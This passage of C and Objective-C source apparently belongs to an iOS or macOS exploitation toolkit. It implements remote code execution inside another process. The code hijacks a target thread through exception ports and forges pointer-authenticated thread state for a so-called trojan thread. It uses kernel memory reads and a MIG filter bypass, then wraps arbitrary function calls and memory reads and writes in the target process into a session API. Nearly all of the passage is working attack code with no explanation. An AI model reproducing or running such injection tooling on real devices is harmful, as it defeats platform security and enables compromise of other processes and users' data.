    RC_DEBUG("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);
    
    ExceptionMessage exc2;
    int desiredTimeout = 1500;
    while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
        reply_with_state(&exc2, &exc2.threadState);
    }
    
    if (!g_RC_trojanThreadAddr)
        g_RC_trojanThreadAddr = firstThread;

    arm_thread_state64_internal newState = exc.threadState;
    sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
    reply_with_state(&exc, &newState);

    if (g_RC_originalThreadOnly) {
        g_RC_creatingExtraThread = false;
        g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
        g_RC_pid = (int)targetPid;
        g_RC_success = true;
        RC_DEBUG("[%s:%d] Original-thread-only RemoteCall ready; skipping synthetic pthread\n",
             __FUNCTION__, __LINE__);
        return 0;
    }
    
    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x100ULL;
    RC_DEBUG("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
    g_RC_success = true;
    
    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
    if (!g_RC_success || bootstrapPid == 0) {
        printf("[%s:%d] bootstrap getpid failed before synthetic thread creation\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }

    uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
    if (!g_RC_success || createResult != 0) {
        printf("[%s:%d] pthread_create_suspended_np remote call failed result=%llu\n",
               __FUNCTION__, __LINE__, createResult);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    
    RC_DEBUG("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    uint64_t pthreadAddr    = remote_read64(trojanMemTemp);
    RC_DEBUG("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__, pthreadAddr);
    if (!pthreadAddr) {
        printf("[%s:%d] pthread_create_suspended_np did not write a pthread pointer\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
    RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
    if (!g_RC_success || !callThreadPort) {
        printf("[%s:%d] pthread_mach_thread_np remote call failed\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
    if (!is_kaddr_valid(g_RC_callThreadAddr)) {
        printf("[%s:%d] failed to resolve synthetic thread kobject port=0x%llx addr=%#llx\n",
               __FUNCTION__, __LINE__, callThreadPort, g_RC_callThreadAddr);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    
    if(useMigFilterBypass)
        mig_bypass_resume();
    
    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
        printf("[%s:%d] Failed set exc port on new thread, retrying...\n", __FUNCTION__, __LINE__);
        pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(selfTask, g_RC_dummyThreadMach);
        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + off_thread_t_tro);
        sleep(1);
        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
            if(useMigFilterBypass)
                mig_bypass_pause();
            destroy_remote_call();
            return -1;
        }
    }
    
    if(useMigFilterBypass)
        mig_bypass_pause();
    
    RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
    
    uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
    if (ret != 0) {
        printf("[%s:%d] Couldn't resume new thread, falling back to original\n", __FUNCTION__, __LINE__);
        g_RC_creatingExtraThread = false;
    }
    
    if (g_RC_creatingExtraThread) {
        RC_DEBUG("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
        restore_trojan_thread(&g_RC_originalState);
    }
    RC_DEBUG("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);

    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
    printf("[RemoteCall] Synthetic call thread live inside %s (pid=%d).\n", process, g_RC_pid);
    
    g_RC_trojanMem = do_remote_call_stable(1000, "mmap", 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0, 0, 0);
    
    do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
    
    g_RC_success = true;
    RC_DEBUG("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);

    return 0;
}

int init_remote_call_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    int previousTimeout = state->firstExceptionTimeoutMS;
    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : previousTimeout;
    int result = init_remote_call(process, useMigFilterBypass);
    state->firstExceptionTimeoutMS = previousTimeout;
    return result;
}

int init_remote_call_original_thread_only_with_first_exception_timeout(const char* process, bool useMigFilterBypass, int firstExceptionTimeoutMS)
{
    RemoteCallState *state = remote_call_current_state();
    bool previousOriginalThreadOnly = state->originalThreadOnly;
    state->originalThreadOnly = true;
    int result = init_remote_call_with_first_exception_timeout(process, useMigFilterBypass, firstExceptionTimeoutMS);
    state->originalThreadOnly = previousOriginalThreadOnly;
    return result;
}

@implementation RemoteCallSession {
    RemoteCallState _state;
}

- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:120000];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
{
    return [self initWithProcess:process
              useMigFilterBypass:useMigFilterBypass
         firstExceptionTimeoutMS:firstExceptionTimeoutMS
              originalThreadOnly:NO];
}

- (instancetype)initWithProcess:(NSString *)process
              useMigFilterBypass:(BOOL)useMigFilterBypass
         firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
              originalThreadOnly:(BOOL)originalThreadOnly
{
    self = [super init];
    if (!self)
        return nil;

    memset(&_state, 0, sizeof(_state));
    _state.success = true;
    _state.threadList = [NSMutableArray new];
    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0 ? firstExceptionTimeoutMS : 120000;
    _state.stableExceptionTimeoutFloorMS = 10000;
    _state.originalThreadOnly = originalThreadOnly;
    _state.vphoneBridgeFD = -1;

    const char *processName = process.UTF8String;
    if (!processName)
        return nil;

    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = init_remote_call(processName, useMigFilterBypass);
    if (result != 0) {
        abandon_remote_call();
    }
    remote_call_pop_state(previous);

    if (result != 0)
        return nil;

    return self;
}

- (void)dealloc
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    if (remote_call_has_local_state()) {
        destroy_remote_call();
    }
    remote_call_pop_state(previous);
}

- (uint64_t)taskAddr
{
    return _state.taskAddr;
}

- (uint64_t)trojanMem
{
    return _state.trojanMem;
}

- (int)pid
{
    return _state.pid;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)doRemoteCallStableWithTimeout:(int)timeout
                          functionAddress:(uint64_t)pcAddr
                             functionName:(const char *)name
                                       x0:(uint64_t)x0
                                       x1:(uint64_t)x1
                                       x2:(uint64_t)x2
                                       x3:(uint64_t)x3
                                       x4:(uint64_t)x4
                                       x5:(uint64_t)x5
                                       x6:(uint64_t)x6
                                       x7:(uint64_t)x7
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = do_remote_call_stable_addr(timeout, pcAddr, name, x0, x1, x2, x3, x4, x5, x6, x7);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteRead:(uint64_t)src to:(void *)dst size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_read(src, dst, size);
    remote_call_pop_state(previous);
    return result;
}

- (uint64_t)remoteRead64:(uint64_t)src
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    uint64_t result = remote_read64(src);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite:(uint64_t)dst from:(const void *)src size:(uint64_t)size
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write(dst, src, size);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWrite64:(uint64_t)dst value:(uint64_t)val
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_write64(dst, val);
    remote_call_pop_state(previous);
    return result;
}

- (BOOL)remoteWriteString:(uint64_t)dst value:(const char *)str
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_writeStr(dst, str);
    remote_call_pop_state(previous);
    return result;
}

- (int)destroyRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    int result = destroy_remote_call();
    remote_call_pop_state(previous);
    return result;
}

- (void)abandonRemoteCall
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    abandon_remote_call();
    remote_call_pop_state(previous);
}

- (BOOL)hasLocalState
{
    RemoteCallState *previous = remote_call_push_state(&_state);
    BOOL result = remote_call_has_local_state();
    remote_call_pop_state(previous);
    return result;
}

- (RemoteCallState *)remoteCallStatePointer
{
    return &_state;
}

- (RemotePointer *)objectAtIndexedSubscript:(NSUInteger)address
{
    return [[RemotePointer alloc] initWithSession:self address:address];
}

@end

#define REMOTE_POINTER_DEFAULT_STRING_MAX 0x4000
#define REMOTE_POINTER_STRING_CHUNK 0x100

@implementation RemotePointer

- (instancetype)initWithSession:(RemoteCallSession *)session address:(uint64_t)address
{
    self = [super init];
    if (!self)
        return nil;

    _session = session;
    _address = address;
    return self;
}

- (BOOL)readTo:(void *)dst size:(uint64_t)size
{
    return [_session remoteRead:_address to:dst size:size];
}

- (BOOL)writeFrom:(const void *)src size:(uint64_t)size
{
    return [_session remoteWrite:_address from:src size:size];
}

- (BOOL)writeCString:(const char *)string
{
    return [_session remoteWriteString:_address value:string];
}

- (void)setString:(NSString *)string
{
    [self writeCString:string.UTF8String];
}

- (NSString *)string
{
    return [self stringWithMaxLength:REMOTE_POINTER_DEFAULT_STRING_MAX];
}

- (NSString *)stringWithMaxLength:(size_t)maxLength
{
    if (!_session || !_address || maxLength == 0)
        return nil;

    char *buf = (char *)calloc(maxLength + 1, 1);
    if (!buf)
        return nil;

    size_t copied = 0;
    while (copied < maxLength) {
        size_t chunk = REMOTE_POINTER_STRING_CHUNK;
        if (chunk > maxLength - copied)
            chunk = maxLength - copied;

        uint64_t current = _address + copied;
        size_t pageRemaining = (size_t)(PAGE_SIZE - (current & PAGE_MASK));
        if (chunk > pageRemaining)
            chunk = pageRemaining;

        if (![_session remoteRead:_address + copied to:buf + copied size:chunk]) {
            free(buf);
            return nil;
        }

        char *end = memchr(buf + copied, 0, chunk);
        if (end) {
            size_t length = (size_t)(end - buf);
            NSString *result = [[NSString alloc] initWithBytes:buf length:length encoding:NSUTF8StringEncoding];
            free(buf);
            return result;
        }

        copied += chunk;
    }

    NSString *result = [[NSString alloc] initWithBytes:buf length:maxLength encoding:NSUTF8StringEncoding];
    free(buf);
    return result;
}

- (void)setValue8:(uint8_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint8_t)value8
{
    uint8_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue16:(uint16_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint16_t)value16
{
    uint16_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue32:(uint32_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint32_t)value32
{
    uint32_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

- (void)setValue64:(uint64_t)value
{
    [self writeFrom:&value size:sizeof(value)];
}

- (uint64_t)value64
{
    uint64_t value = 0;
    [self readTo:&value size:sizeof(value)];
    return value;
}

@end

void remote_call_with_session(RemoteCallSession *session, void (^block)(void))
{
    if (!block)
        return;

    if (!session) {
        block();
        return;
    }

    RemoteCallState *state = [session remoteCallStatePointer];
    RemoteCallState *previous = remote_call_push_state(state);
    @try {
        block();
    } @finally {
        remote_call_pop_state(previous);
    }
}
